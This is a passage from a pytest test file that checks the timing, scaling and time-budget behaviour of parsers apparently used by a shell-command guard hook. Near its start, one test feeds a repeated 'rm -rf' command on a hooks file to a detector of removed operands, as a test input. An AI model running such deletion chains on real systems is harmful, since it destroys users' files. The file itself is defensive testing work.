    reader = _bash_patterns._removed_or_relocated_cached
    payload = "rm -rf tools/cc/hooks/x.py; " * 16
    _clear_walker_caches()
    _bash_patterns.iter_removed_or_relocated_operands(payload)
    assert reader.cache_info().currsize >= 1  # the reader memoised the payload
    _bash_patterns.iter_removed_or_relocated_operands(payload)
    assert reader.cache_info().hits >= 1  # the second call read it back
    _clear_walker_caches()
    info = reader.cache_info()
    assert (info.currsize, info.hits, info.misses) == (0, 0, 0), info


def test_scaling_windows_sample_with_the_collector_paused():
    """A scaling window pauses the cyclic collector around its samples and
    restores it after. The collector's full collections cost in proportion
    to the live heap and only the larger payload's allocations trigger one,
    so a long pytest process reads a linear consumer as super-linear: the
    release matrix's stage 02 read 162.7 -> 496.1 ms (ratio 3.05) on
    2026-09-23 where a fresh process reads 2.03, a 4M-object ballast
    reproduced it at 2.22 and the pause under the ballast read 2.02. Driven
    by the collector's own switch rather than by timing: the consumer sees it
    off on every sample, the caller sees it as it was before and after. Both
    arms' windows, which time the zero payload at their two ends and their two
    sizes interleaved between (DEF-2000, DEF-2002), every call counted."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    seen: list[bool] = []

    def consumer(payload: str, root: Path | None = None) -> None:
        seen.append(gc.isenabled())

    was_on = gc.isenabled()
    assert isinstance(_walker_window_ms(consumer, "xx", "x", "", Path(".")), tuple)
    assert len(seen) == _WINDOW_ZERO_SAMPLES + 2 * _WALKER_SAMPLES and not any(seen), seen
    assert gc.isenabled() == was_on
    seen.clear()
    assert isinstance(_ps_body_window_ms(consumer, "xx", "x", ""), tuple)
    assert len(seen) == _WINDOW_ZERO_SAMPLES + 2 * _PS_BODY_SAMPLES and not any(seen), seen
    assert gc.isenabled() == was_on


def test_walker_scaling_row_judges_the_two_windows_as_pairs(tmp_path, monkeypatch):
    """A window whose small samples ran at a quarter cost and whose large ones
    ran at cost (the shape a one-sided stall leaves) reads 8.0 as a pair and
    is not rescued by MIXING it with a clean second window: the fastest small
    with the fastest big across windows is 8.0 again, which is what the first
    draft computed and why a clean second window could never clear a red.
    The pair rule reads the clean window's 2.0 and passes. The mixed estimate
    is recomputed below from the same scheduled costs and shown over the
    bound it would have been judged by, so this row is red under the draft's
    rule by construction. The length assertion is the PRECONDITION (window
    one must exceed the bound for a second to be taken), not the subject: a
    red there on a loaded box is read as scheduling first."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    cap = _BASH_COMMAND_CAP
    n_big, n_small = _walker_sizes(cap)
    unit_ms = 40.0 / n_big  # the large payload costs 40 ms at cost, the small 20
    calls: list[tuple[int, float]] = []

    def stand_in(payload: str, root: Path) -> None:
        # the first _WALKER_SAMPLES SMALL calls are window one's small samples
        # at a quarter cost; every other call -- the warm and the zero-payload
        # calls at 64 bytes, window one's big samples, all of window two --
        # runs at cost, so window one reads 8.0 and window two 2.0. Keyed on
        # the small calls seen, not on call position: the row measures its
        # per-call cost on a 64-byte payload (before window one from 2026-09-23,
        # at each window's two ends since DEF-2002), and a position-keyed
        # schedule put the quarter on those calls and never took a second
        # window. A spin on the monotonic clock, not a
        # sleep: macOS coalesces short sleeps by milliseconds, which lifted a
        # 5 ms sample over the bound.
        smalls_seen = sum(1 for size, _ in calls if size == n_small)
        quarter = len(payload) == n_small and smalls_seen < _WALKER_SAMPLES
        cost = len(payload) * unit_ms * (0.25 if quarter else 1.0)
        calls.append((len(payload), cost))
        end = time.perf_counter() + cost / 1000.0
        while time.perf_counter() < end:
            pass

    monkeypatch.setattr(sys.modules[__name__], "_WALKER_CONSUMERS", [("stand_in", stand_in, cap)])
    test_bash_walker_scales_linearly_on_opener_flood("pairs", lambda n: "x" * n, tmp_path)
    smalls = [c for size, c in calls[1:] if size == n_small]
    bigs = [c for size, c in calls[1:] if size == n_big]
    assert len(smalls) == len(bigs) == 2 * _WALKER_SAMPLES, calls  # two windows were taken
    # the draft's estimate, on these same scheduled costs, is over the bound it
    # would have judged them by
    assert min(bigs) > _WALKER_LINEAR_RATIO * min(smalls) + _WALKER_NOISE_FLOOR_MS, (smalls, bigs)


def test_walker_scaling_row_still_reds_a_quadratic_consumer_under_the_pair_rule(tmp_path, monkeypatch):
    """The must-trip control for the pair rule, which is more permissive than
    the mixed estimate it replaced (one clean window can now acquit a reading
    two windows confirmed): a stand-in whose cost is quadratic in the payload
    reads about 4 on BOTH windows, and the row reds naming it."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    cap = _BASH_COMMAND_CAP
    n_big, _n_small = _walker_sizes(cap)

    def quadratic(payload: str, root: Path) -> None:
        cost = 40.0 * (len(payload) / n_big) ** 2  # 40 ms at the large size, 10 at half
        end = time.perf_counter() + cost / 1000.0
        while time.perf_counter() < end:
            pass

    monkeypatch.setattr(sys.modules[__name__], "_WALKER_CONSUMERS", [("quadratic", quadratic, cap)])
    with pytest.raises(AssertionError, match="super-linear on two windows"):
        test_bash_walker_scales_linearly_on_opener_flood("quadratic", lambda n: "x" * n, tmp_path)


def test_walker_scaling_row_reads_a_quadratic_through_a_slowdown_on_its_small_samples(tmp_path, monkeypatch):
    """DEF-2000, the walker arm: a slowdown as long as a window's three small
    samples take back to back reads a quadratic consumer 15 -> 40 ms, ratio
    2.67, inside the 3.0 bound and over the flat ratio, so no second window was
    asked and the consumer passed. The window interleaves its samples, so the
    slowdown also covers the first big sample and the clean ones set both
    floors. On a simulated clock (:func:`_burst_call_clock`), so its windows
    need no alarm; its warm call is the real one under the alarm, so it skips
    on a host without SIGALRM."""
    cap = _BASH_COMMAND_CAP
    n_big, n_small = _walker_sizes(cap)
    small_ms = 40.0 * (n_small / n_big) ** 2
    calls: list[int] = []
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms", _burst_call_clock(
        40.0, n_big, _WALKER_SAMPLES * _BURST_FACTOR * small_ms, calls))
    problem, unjudged = _walker_scaling_judgement(
        "quadratic", lambda _p, _r: None, cap, lambda n: "x" * n, tmp_path)
    assert unjudged is None, unjudged
    assert problem is not None and "super-linear on two windows" in problem, problem
    # two windows, each interleaved small-first
    assert [n for n in calls if n > 64] == [n_small, n_big] * (2 * _WALKER_SAMPLES), calls


@pytest.mark.parametrize("at", ["head", "tail"])
@pytest.mark.parametrize("net_small_ms", [20.0, 24.0], ids=["net-20ms", "net-24ms"])
def test_walker_scaling_row_reads_a_linear_consumer_linear_through_a_slowdown_on_its_floor(
        tmp_path, monkeypatch, net_small_ms, at):
    """DEF-2002, the walker arm: the per-call cost was the floor of three zero-payload
    calls read back to back before the first window, and both windows were judged net
    of it, so one slowdown over those three calls (30 ms each, 1.5 times) read a
    linear consumer 4.9 -> 24.9 ms at 20 ms net (ratio 5.1) and 8.9 -> 32.9 at 24:
    super-linear on two windows, a false red only a linear consumer could get. A
    window now times the zero payload at its two ends and is judged net of its own
    floor, so a slowdown over its opening sample (``head``) or its closing one
    (``tail``) leaves the other end to set the floor: no problem, nothing unjudged,
    and no second window asked (a window that took the larger of its two zero
    samples would read the first window super-linear and be rescued by the second).
    On a simulated clock (:func:`_floor_slowdown_clock`), so its windows need no
    alarm; its warm call is the real one under the alarm, so it skips on a host
    without SIGALRM."""
    cap = _BASH_COMMAND_CAP
    n_big, _n_small = _walker_sizes(cap)
    calls: list[tuple[int, bool]] = []
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms", _floor_slowdown_clock(
        net_small_ms, n_big, _WALKER_SAMPLES, calls, at=at))
    problem, unjudged = _walker_scaling_judgement(
        "linear", lambda _p, _r: None, cap, lambda n: "x" * n, tmp_path)
    assert (64, True) in calls, calls  # the slowdown reached a zero-payload call
    assert (problem, unjudged) == (None, None), (problem, unjudged)
    assert sum(1 for n, _ in calls if n == n_big) == _WALKER_SAMPLES, calls  # one window was enough


def test_each_scaling_window_is_judged_net_of_its_own_floor(tmp_path, monkeypatch):
    """DEF-2002: two spikes on exactly the first window's two zero-payload samples
    lift that window's floor alone -- the one shape a zero at each end cannot see --
    and read a linear consumer super-linear there (about 9 -> 33 ms net at 24 ms);
    the second window is judged net of its OWN floor and reads it linear, on both
    arms. Judged net of the first window's floor, the second reads super-linear too
    and the row reds. The same spikes at 20 ms net, the row's own example, read the
    PowerShell arm's half-cap sample under its 5 ms floor on the first window, which
    is not asked again: that red names the per-call cost as its cause
    (:func:`test_the_ps_body_under_floor_red_names_a_swamped_sample_by_cause`). On a
    simulated clock (:func:`_floor_slowdown_clock`), so its windows need no alarm;
    the walker arm's warm call is the real one under the alarm, so on a host
    without SIGALRM the row skips there, after the PowerShell arm has run."""
    n_big = _WORST_CASE_BODY_LEN
    calls: list[tuple[int, bool]] = []
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms", _floor_slowdown_clock(
        24.0, n_big, _PS_BODY_SAMPLES, calls, at="spikes"))
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert [n for n, slowed in calls if slowed] == [64, 64], calls
    assert sum(1 for n, _ in calls if n == n_big) == 2 * _PS_BODY_SAMPLES, calls  # a second window was asked
    assert verdict is None, f"a linear body read: {verdict}"
    cap = _BASH_COMMAND_CAP
    n_big, _n_small = _walker_sizes(cap)
    calls = []
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms", _floor_slowdown_clock(
        24.0, n_big, _WALKER_SAMPLES, calls, at="spikes"))
    problem, unjudged = _walker_scaling_judgement(
        "linear", lambda _p, _r: None, cap, lambda n: "x" * n, tmp_path)
    assert [n for n, slowed in calls if slowed] == [64, 64], calls
    assert sum(1 for n, _ in calls if n == n_big) == 2 * _WALKER_SAMPLES, calls  # a second window was asked
    assert (problem, unjudged) == (None, None), (problem, unjudged)


def test_the_ps_body_under_floor_red_names_a_swamped_sample_by_cause(monkeypatch):
    """DEF-2002, by DEF-926's rule: the PowerShell arm's under-floor sample stays a
    red, and its sentence names the cause. Two spikes on the first window's zero
    samples, at 20 ms net and a 30 ms per-call cost, read the half-cap sample 4.9 ms
    net of a 45.1 ms floor -- a per-call cost above what is left of the sample --
    which the arm used to diagnose as a box much faster than the floors' host, the
    remedy DEF-926 took off the walker arm. The fast-box sentence is kept where the
    per-call cost is small (:func:`test_ps_body_scaling_rule_reds_a_pair_under_the_sample_floor`),
    and where it is under this arm's own 5 ms floor: 3 ms of per-call cost over 1 ms
    net is a whole sample under the floor, a fast box."""
    n_big = _WORST_CASE_BODY_LEN
    calls: list[tuple[int, bool]] = []
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms", _floor_slowdown_clock(
        20.0, n_big, _PS_BODY_SAMPLES, calls, at="spikes"))
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert verdict is not None and "mostly the 45.1ms per-call cost" in verdict, verdict
    assert "slow or loaded host" in verdict and "re-run" in verdict and "never widen" in verdict, verdict
    assert "much faster" not in verdict, verdict
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms", _window_costs_clock(
        [(3.0, 4.0, 10.0)], _PS_BODY_SAMPLES, n_big // 2, n_big, []))
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert verdict is not None and "much faster" in verdict and "slow or loaded" not in verdict, verdict


def test_a_scaling_red_names_the_floor_of_the_window_it_reports(tmp_path, monkeypatch):
    """With a floor per window the two windows can subtract different per-call costs
    (DEF-2002), so a red names the floor of the window its reading rests on, and the
    first window's beside it when the second was chosen. A quadratic reads 25 ->
    145 ms net of a 45 ms floor on the first window and 40 -> 160 net of 30 on the
    second, chosen for its lower ratio, on both arms. A sentence naming the wrong
    floor sends the maintainer after a per-call cost the reading never subtracted."""
    n_big = _WORST_CASE_BODY_LEN
    calls: list[int] = []
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms", _window_costs_clock(
        [(45.0, 70.0, 190.0), (30.0, 70.0, 190.0)], _PS_BODY_SAMPLES, n_big // 2, n_big, calls))
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert verdict is not None and "40.0ms at 15000 bytes -> 160.0ms" in verdict, verdict
    assert "net of the 30.0ms per-call cost" in verdict, verdict
    assert "the first window read 25.0 -> 145.0ms net of its 45.0ms" in verdict, verdict
    cap = _BASH_COMMAND_CAP
    n_big, n_small = _walker_sizes(cap)
    calls = []
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms", _window_costs_clock(
        [(45.0, 70.0, 190.0), (30.0, 70.0, 190.0)], _WALKER_SAMPLES, n_small, n_big, calls))
    problem, unjudged = _walker_scaling_judgement(
        "quadratic", lambda _p, _r: None, cap, lambda n: "x" * n, tmp_path)
    assert unjudged is None and problem is not None, (problem, unjudged)
    assert "(40.0 -> 160.0ms net of the 30.0ms per-call cost" in problem, problem
    assert "the first window read 70.0 -> 190.0ms (ratio 5.80 net of its 45.0ms)" in problem, problem


def test_a_second_window_under_the_floor_is_read_by_its_own_floor(tmp_path, monkeypatch):
    """A second window whose half-cap sample falls under the floor is diagnosed by
    ITS OWN per-call cost (DEF-2002 with DEF-926's routing), not the first window's.
    PowerShell: 10 -> 40 ms net of a 1 ms floor asks again, and the second window
    reads 3 ms net of 9: a red naming the 9 ms cost and a slow or loaded host.
    Walker: 2.5 -> 11 ms net of 1 asks again, and 1 ms net of 5 is a swamped sample,
    skipped with that cause and window one's reading beside it; judged by the first
    window's 1 ms, it would red with the fast-box remedies."""
    n_big = _WORST_CASE_BODY_LEN
    calls: list[int] = []
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms", _window_costs_clock(
        [(1.0, 11.0, 41.0), (9.0, 12.0, 41.0)], _PS_BODY_SAMPLES, n_big // 2, n_big, calls))
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    assert verdict is not None and "mostly the 9.0ms per-call cost (3.0ms net on the second window)" in verdict, verdict
    assert "much faster" not in verdict, verdict
    cap = _BASH_COMMAND_CAP
    n_big, n_small = _walker_sizes(cap)
    calls = []
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms", _window_costs_clock(
        [(1.0, 3.5, 12.0), (5.0, 6.0, 12.0)], _WALKER_SAMPLES, n_small, n_big, calls))
    problem, unjudged = _walker_scaling_judgement(
        "stand_in", lambda _p, _r: None, cap, lambda n: "x" * n, tmp_path)
    assert problem is None and unjudged is not None, (problem, unjudged)
    assert "mostly the 5.0ms per-call cost" in unjudged, unjudged
    assert "the first read 3.5 -> 12.0ms (ratio 4.40 net of its 1.0ms)" in unjudged, unjudged


@pytest.mark.parametrize("hung", [64, "big"], ids=["zero-payload", "big"])
def test_a_scaling_overrun_names_the_call_that_overran(tmp_path, monkeypatch, hung):
    """A window's overrun names the call that hit the alarm: the zero-payload call
    points at the host (a reader rebuild or a setup that hangs), a payload by its
    bytes at the shape. Both arms; DEF-2002 moved the zero-payload call inside the
    windows, and the speedbump arm's form is the precedent (DEF-4001: a bare None
    could not say). On a stubbed one-call timer that reads an overrun as None."""
    n_big = _WORST_CASE_BODY_LEN
    length = 64 if hung == 64 else n_big
    monkeypatch.setattr(sys.modules[__name__], "_ps_body_call_ms",
                        lambda _fn, payload: None if len(payload) == length else 1.0)
    verdict = _ps_body_scaling_verdict(lambda _p: None, "x" * n_big, "x" * (n_big // 2), "x" * 64)
    expected = "on the zero-payload call" if hung == 64 else f"at {n_big} bytes"
    assert verdict == f"exceeded {_CHAIN_CEILING_MS}ms {expected}", verdict
    cap = _BASH_COMMAND_CAP
    n_big, _n_small = _walker_sizes(cap)
    length = 64 if hung == 64 else n_big
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms",
                        lambda _c, payload, _r: None if len(payload) == length else 1.0)
    problem, unjudged = _walker_scaling_judgement(
        "stand_in", lambda _p, _r: None, cap, lambda n: "x" * n, tmp_path)
    expected = "on the zero-payload call" if hung == 64 else f"at {n_big} bytes"
    assert (problem, unjudged) == (f"stand_in: exceeded {_WALKER_CEILING_MS}ms {expected}", None)


#: DEF-5023's stand-in cost: a consumer regressed to just under the per-call alarm,
#: so no call trips it and every judgement runs to its full cost.
_REGRESSED_CALL_MS = _WALKER_CEILING_MS - 300.0


def _walker_row_on_a_simulated_clock(monkeypatch, cost_of):
    """The walker row's five consumers as instant stand-ins under their real
    names and caps, each window call costing ``cost_of(name, kind)`` ms of a
    simulated clock that the row's budget reads (`_walker_clock`), where ``kind``
    is "zero", "small" or "big" by that consumer's own sizes (its cap's); the
    warm call goes through the real alarm and costs nothing. Patched with
    `raising=False` so the row reds on its behaviour, not on a missing name,
    where the budget is not built. Returns the clock."""
    now = [0.0]
    names: dict[int, tuple[str, int]] = {}
    consumers = []
    for name, _consumer, cap in _WALKER_CONSUMERS:
        def stand_in(_payload, _root):
            return None
        names[id(stand_in)] = (name, _walker_sizes(cap)[0])
        consumers.append((name, stand_in, cap))

    def timed(consumer, payload, _root):
        name, n_big = names[id(consumer)]
        kind = "zero" if len(payload) <= 64 else "big" if len(payload) == n_big else "small"
        ms = cost_of(name, kind)
        now[0] += ms / 1000.0
        return ms

    monkeypatch.setattr(sys.modules[__name__], "_WALKER_CONSUMERS", consumers)
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms", timed)
    monkeypatch.setattr(sys.modules[__name__], "_walker_clock", lambda: now[0], raising=False)
    return now


def _linear_ms(_name, kind):
    """A healthy consumer: 1 ms per call, 10 ms net at the half-cap size and 20
    at the cap (a ratio of 2.0 on one window)."""
    return {"zero": 1.0, "small": 11.0, "big": 21.0}[kind]


def _window_costs(zero_ms: float, small_ms: float, big_ms: float) -> list[float]:
    """One window's call costs, in :func:`_window_order`'s order."""
    by_floor = (zero_ms, small_ms, big_ms)
    return [by_floor[floor] for floor, _ in _window_order("z", "s", "b", _WALKER_SAMPLES)]


def _calls_before_the_stop(costs_ms: list[float], start_s: float = 0.0) -> tuple[int, float]:
    """How many of the calls costing ``costs_ms`` the walker row's stop check lets
    start from ``start_s`` on its simulated clock, and the clock after them: the
    check's rule re-derived from the constants, so a re-pinned ceiling or margin
    moves each row's expectation with it (the rows below read it rather than a
    literal count)."""
    budget = _walker_row_budget_s(_pyproject_timeout_s())
    assert budget is not None
    now, started = start_s, 0
    for ms in costs_ms:
        if now + _WALKER_CEILING_MS / 1000.0 > budget:
            break
        now += ms / 1000.0
        started += 1
    return started, now


def test_the_walker_row_reds_with_its_readings_before_the_timeout(tmp_path, monkeypatch):
    """DEF-5023: every consumer regressed to just under the per-call alarm. Until
    the row ran inside a time budget, pytest's per-test timeout killed it at 60 s
    and the whole report was "worker 'gw0' crashed while running ..." (Task 0, the
    real clock on the Air, 2026-10-18). Now the next call is not started once one
    ceiling no longer fits in the budget, and the row reds naming the consumer and
    window in flight, the samples it took, the consumers not reached, none
    finished, and a regressed consumer as the cause (its calls sit near the
    ceiling). On a simulated clock, so it needs no real wait."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    now = _walker_row_on_a_simulated_clock(monkeypatch, lambda _name, _kind: _REGRESSED_CALL_MS)
    with pytest.raises(pytest.fail.Exception) as red:
        test_bash_walker_scales_linearly_on_opener_flood("open_paren_run", lambda n: "x" * n, tmp_path)
    text = str(red.value)
    names = [name for name, _c, _cap in _WALKER_CONSUMERS]
    started, clock = _calls_before_the_stop([_REGRESSED_CALL_MS] * 8)
    assert 0 < started < 8, started  # the stop falls inside the first window
    assert f"next call of {names[0]} (window 1, after {started} of its 8 calls" in text, text
    order = [floor for floor, _ in _window_order("z", "s", "b", _WALKER_SAMPLES)][:started]
    samples = [", ".join([f"{_REGRESSED_CALL_MS:.1f}"] * order.count(floor)) or "none" for floor in (0, 1, 2)]
    assert f"its samples so far (ms): zero {samples[0]}, small {samples[1]}, big {samples[2]}" in text, text
    assert "finished none" in text and f"not reached {', '.join(names[1:])}" in text, text
    assert "A consumer regressed toward its ceiling" in text and "slow host" not in text, text
    assert now[0] == pytest.approx(clock) and now[0] <= _walker_row_budget_s(_pyproject_timeout_s()), now[0]


def test_a_regressed_consumer_names_the_ones_before_and_after_it(tmp_path, monkeypatch):
    """A healthy consumer, one that reds flat, one a slow host swamped, then one
    regressed toward its ceiling: the red gives the three finished outcomes in
    the row's order (the flat red with its whole text and remedy), the regressed
    one in flight, and the last as not reached -- the cost of the budget, named in
    the red. The regressed consumer's zero-payload call is cheap, so without the
    budget it reads flat and the row reds rather than skips."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    names = [name for name, _c, _cap in _WALKER_CONSUMERS]
    flat = (1.0, 11.0, 11.0)
    swamped = (195.0, 196.1, 197.2)
    regressed = (1.0, _REGRESSED_CALL_MS, _REGRESSED_CALL_MS)

    def cost_of(name, kind):
        if name == names[0]:
            return _linear_ms(name, kind)
        zero, small, large = {names[1]: flat, names[2]: swamped, names[3]: regressed}.get(name, (1.0, 1.0, 1.0))
        return {"zero": zero, "small": small, "big": large}[kind]

    _walker_row_on_a_simulated_clock(monkeypatch, cost_of)
    with pytest.raises(pytest.fail.Exception) as red:
        test_bash_walker_scales_linearly_on_opener_flood("open_paren_run", lambda n: "x" * n, tmp_path)
    text = str(red.value)
    before = (sum(_window_costs(1.0, 11.0, 21.0)) + 2 * sum(_window_costs(*flat)) + sum(_window_costs(*swamped)))
    started, _clock = _calls_before_the_stop(_window_costs(*regressed), before / 1000.0)
    assert f"finished {names[0]} linear, ratio 2.00" in text, text
    assert f"; {names[1]} red (" in text and "re-declare it" in text, text  # the whole text, its remedy kept
    assert f"; {names[2]} unjudged (swamped)" in text, text
    assert f"next call of {names[3]} (window 1, after {started} of its 8 calls" in text, text
    assert f"not reached {names[4]}" in text and "A consumer regressed toward its ceiling" in text, text


def test_a_stop_in_the_second_window_keeps_the_first_windows_reading(tmp_path, monkeypatch):
    """A super-linear first window is what sends a consumer to a second, so a
    quadratic regression meets the budget there: the second window's calls are
    checked against it too (a refactor that dropped it would run on to the
    timeout), the red names the second window, and it gives the first window's
    reading, the reason the second ran, so it does not read as a slow host."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    names = [name for name, _c, _cap in _WALKER_CONSUMERS]
    # (window 1's zero/small/big, each window-2 call, window 1's reading as the red gives it): the first
    # window-2 call nears the ceiling; the second stays under half of it, so only window 1's reading says
    # a consumer regressed rather than a slow host
    cases = (((1.0, 11.0, 61.0), _REGRESSED_CALL_MS, "window 1 read 11.0 -> 61.0ms (ratio 6.00 net of its 1.0ms)"),
             ((1000.0, 2000.0, 5000.0), 4000.0,
              "window 1 read 2000.0 -> 5000.0ms (ratio 4.00 net of its 1000.0ms)"))
    for costs, window_2_ms, reading in cases:
        first = _window_costs(*costs)
        seen = [0]

        def cost_of(name, kind, first=first, window_2_ms=window_2_ms, seen=seen):
            if name != names[0]:
                return _linear_ms(name, kind)
            seen[0] += 1
            if seen[0] <= len(first):
                return first[seen[0] - 1]
            # window 2: a cheap zero-payload call, so without the budget it reads flat and reds, never swamped
            return 1.0 if kind == "zero" else window_2_ms

        now = _walker_row_on_a_simulated_clock(monkeypatch, cost_of)
        with pytest.raises(pytest.fail.Exception) as red:
            test_bash_walker_scales_linearly_on_opener_flood("open_paren_run", lambda n: "x" * n, tmp_path)
        text = str(red.value)
        started, clock = _calls_before_the_stop(_window_costs(1.0, window_2_ms, window_2_ms), sum(first) / 1000.0)
        assert 0 < started < 8, (costs, started)
        assert f"next call of {names[0]} (window 2, after {started} of its 8 calls" in text, text
        assert f"{reading}, super-linear, so a second window was asked" in text, text
        assert "A consumer regressed toward its ceiling" in text and "slow host" not in text, text
        assert now[0] == pytest.approx(clock) and now[0] <= _walker_row_budget_s(_pyproject_timeout_s()), now[0]


def test_a_stop_at_a_warm_call_on_a_slow_host_names_the_host(tmp_path, monkeypatch):
    """A healthy but slow first consumer (4 s a call, linear) ends past the point
    where one more ceiling fits: the next consumer's warm call is checked like any
    capped call and is not started, and with every reading linear and no call in
    flight near the ceiling the red names a slow host, never a regressed consumer
    (DEF-926's lesson: one sentence for two causes sends the maintainer to the
    wrong one)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    names = [name for name, _c, _cap in _WALKER_CONSUMERS]
    slow = (4000.0, 4800.0, 5600.0)  # 800 ms net at the half-cap size, 1600 at the cap: linear

    def cost_of(name, kind):
        if name != names[0]:
            return _linear_ms(name, kind)
        return {"zero": slow[0], "small": slow[1], "big": slow[2]}[kind]

    _walker_row_on_a_simulated_clock(monkeypatch, cost_of)
    started, clock = _calls_before_the_stop(_window_costs(*slow))
    assert started == 8 and clock + _WALKER_CEILING_MS / 1000.0 > _walker_row_budget_s(_pyproject_timeout_s())
    with pytest.raises(pytest.fail.Exception) as red:
        test_bash_walker_scales_linearly_on_opener_flood("open_paren_run", lambda n: "x" * n, tmp_path)
    text = str(red.value)
    assert f"next call of {names[1]} (the warm call)" in text, text
    assert f"finished {names[0]} linear, ratio 2.00" in text, text
    assert "most likely a slow host" in text and "A consumer regressed" not in text, text


def test_the_walker_alarm_interrupts_a_call(tmp_path, monkeypatch):
    """The budget's arithmetic rests on every capped call costing at most one
    ceiling, which only holds while :func:`_walker_alarmed_ms` arms its alarm: a
    call that would spin for a second under a 50 ms ceiling reads None at about
    50 ms. A real alarm on the real clock, spun and never slept."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    monkeypatch.setattr(sys.modules[__name__], "_WALKER_CEILING_MS", 50)

    def spin(_payload, _root):
        end = time.perf_counter() + 1.0
        while time.perf_counter() < end:
            pass

    t0 = time.perf_counter()
    assert _walker_alarmed_ms(spin, "x", tmp_path) is None
    assert (time.perf_counter() - t0) * 1000 < 10 * _WALKER_CEILING_MS  # 500 ms under the 50 ms ceiling


@pytest.mark.parametrize("call", [
    lambda root: _walker_alarmed_ms(lambda _p, _r: None, "x", root),
    lambda root: _ps_body_call_ms(lambda _p: None, "x"),
], ids=["walker", "ps-body"])
def test_the_walker_and_ps_body_timers_skip_on_a_host_without_sigalrm(tmp_path, monkeypatch, call):
    """The walker timer and the PowerShell body timer skip the test that reached
    them where the signal does not exist (Windows), never an AttributeError: once
    the walker row's warm call went under the alarm (DEF-5023), twelve
    simulated-clock rows reached the walker timer through it and each redded the
    Windows leg. Driven on every host by taking the alarm away, so a dropped guard
    reds on any cell that runs this file. These two timers only: every other read
    of an alarm name is held to its guard by
    tests/test_test_suite_contract.py::test_every_sigalrm_arming_function_guards_itself.
    The alarm half of the shared stand-in (tests/_platform_standin.py) takes the
    names away; the platform half is not called, because these timers are the
    suite's own, skip on ``hasattr(signal, "SIGALRM")`` and read no platform, so
    an ``os`` parameter here would never vary anything (the born-blind shape the
    adopter-axes registry refuses). This node proves no registry cell; the
    bounded spawn's timeout-shape node is the ``os/windows`` proof."""
    # Safe only because this module runs pytest-timeout's thread method (the
    # pytestmark above), which importing without_the_alarm costs it
    # (tests/_platform_standin.py and the suite contract): under the signal method
    # the plugin's cancel reads signal.SIGALRM while it is deleted, an
    # INTERNALERROR that ends the session.
    without_the_alarm(monkeypatch)  # none of the three names exists on Windows
    with pytest.raises(pytest.skip.Exception):
        call(tmp_path)


def test_the_walker_row_passes_inside_its_budget_and_keeps_the_swamped_guard(tmp_path, monkeypatch):
    """Polarity for DEF-5023's budget: five healthy consumers finish well inside
    it and the row passes; and DEF-926's guard still holds under it, a label on
    which every consumer's sample was swamped by the per-call cost reds rather
    than skips."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    now = _walker_row_on_a_simulated_clock(monkeypatch, _linear_ms)
    test_bash_walker_scales_linearly_on_opener_flood("open_paren_run", lambda n: "x" * n, tmp_path)
    assert 0 < now[0] < 1.0, now[0]  # five consumers, one window each, about half a second of the budget
    _walker_row_on_a_simulated_clock(monkeypatch, lambda _name, kind: 195.0 if kind == "zero" else 196.1)
    with pytest.raises(AssertionError, match="every consumer's sample was swamped"):
        test_bash_walker_scales_linearly_on_opener_flood("open_paren_run", lambda n: "x" * n, tmp_path)


def test_the_walker_warm_call_is_under_the_alarm(tmp_path, monkeypatch):
    """The warm call paid compilation with no alarm, so a consumer that hung there
    hung the row until pytest killed it (DEF-5023). It now goes through
    :func:`_walker_alarmed_ms` once, before the windows, and an overrun there is
    a problem named as the warm call's."""
    seen: list[int] = []

    def spy(_consumer, payload, _root):
        seen.append(len(payload))
        return None if hung else 1.0

    monkeypatch.setattr(sys.modules[__name__], "_walker_alarmed_ms", spy, raising=False)
    monkeypatch.setattr(sys.modules[__name__], "_walker_call_ms", lambda _c, payload, _r: (
        1.0 if len(payload) == 64 else 1.0 + 20.0 * len(payload) / _walker_sizes(_BASH_COMMAND_CAP)[0]))
    for hung in (False, True):
        seen.clear()
        problem, unjudged = _walker_scaling_judgement(
            "stand_in", lambda _p, _r: None, _BASH_COMMAND_CAP, lambda n: "x" * n, tmp_path)
        assert seen == [64], seen  # the warm call, once, under the alarm
        assert (problem, unjudged) == ((f"stand_in: exceeded {_WALKER_CEILING_MS}ms on the warm call", None)
                                       if hung else (None, None)), (hung, problem, unjudged)


#: The slowest healthy walker label on the full tier's serial cells: 10.29 s
#: (`mixed_openers`, test-serial 3.12, run 39107233561), over ten cells of two
#: runs read 2026-10-18; the 3.11 cells read 4.8 and 7.0.
_WALKER_LABEL_CI_MAX_S = 10.29


def test_the_walker_row_budget_stays_under_the_per_test_timeout(monkeypatch):
    """DEF-5023's pin, the PS arm's way: the budget is derived from pyproject's
    per-test timeout (read, never copied), and a call is started only while one
